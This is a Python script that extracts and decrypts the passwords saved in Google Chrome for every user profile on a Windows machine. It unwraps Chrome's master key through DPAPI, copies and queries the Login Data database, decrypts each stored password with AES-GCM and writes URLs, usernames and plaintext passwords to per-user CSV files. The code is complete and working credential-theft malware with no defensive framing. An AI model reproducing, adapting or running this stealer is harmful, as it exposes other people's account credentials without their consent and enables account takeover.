import os
import json
import base64
from Crypto.Cipher import AES
import win32crypt
import sqlite3
import csv

def find_users_directory():
    for user_folder in os.listdir('C:\\Users'):
        user_path = os.path.join('C:\\Users', user_folder)
        if os.path.isdir(user_path):
            yield user_path

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state_data = json.load(file)
            encrypted_key = local_state_data['os_crypt']['encrypted_key']
            key_data = base64.b64decode(encrypted_key.encode('utf-8'))
            dpapi_data = key_data[5:]
            decrypted_key = win32crypt.CryptUnprotectData(dpapi_data, None, None, None, 0)[1]
            return decrypted_key

    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        print(f"Error reading the Local State file: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

def get_chrome_passwords(db_path, secret_key, user_folder):
    temp_db_path = 'temp_login_data'
    os.system(f'copy "{db_path}" "{temp_db_path}"')
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()

    try:
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        rows = cursor.fetchall()

        csv_file_path = f'{user_folder}_chrome_passwords.csv'
        with open(csv_file_path, 'w', newline='', encoding='utf-8') as csv_file:
            csv_writer = csv.writer(csv_file)
            csv_writer.writerow(['URL', 'Username', 'Decrypted Password'])

            for row in rows:
                url = row[0]
                username = row[1]
                ciphertext = row[2]

                decrypted_pass = decrypt_password(ciphertext, secret_key)

                csv_writer.writerow([url, username, decrypted_pass])

        print(f"CSV file '{csv_file_path}' created and stored at the current directory for user: {user_folder}")

    except sqlite3.Error as e:
        print(f"Error retrieving data from the database for user {user_folder}: {e}")

    finally:
        conn.close()
        os.remove(temp_db_path)

if __name__ == "__main__":
    current_directory = os.getcwd()
    print(f"Current Directory: {current_directory}")

    success_messages = []
    failed_messages = []

    for user_directory in find_users_directory():
        local_state_path = os.path.join(user_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        login_data_path = os.path.join(user_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

        if os.path.exists(local_state_path):
            secret_key = get_encryption_key(local_state_path)

            if secret_key:
                success_messages.append(f"Decryption Key for {user_directory}: {secret_key.hex()}")
                get_chrome_passwords(login_data_path, secret_key, os.path.basename(user_directory))

            else:
                failed_messages.append(f"Failed to retrieve the encryption key for user: {user_directory}")
        else:
            failed_messages.append(f"Local State file not found for user: {user_directory}")

    # Display success messages
    print("\n".join(success_messages))
    
    # Add a couple of lines of space
    print("\n" * 2)

    # Display failed messages
    print("\n".join(failed_messages))
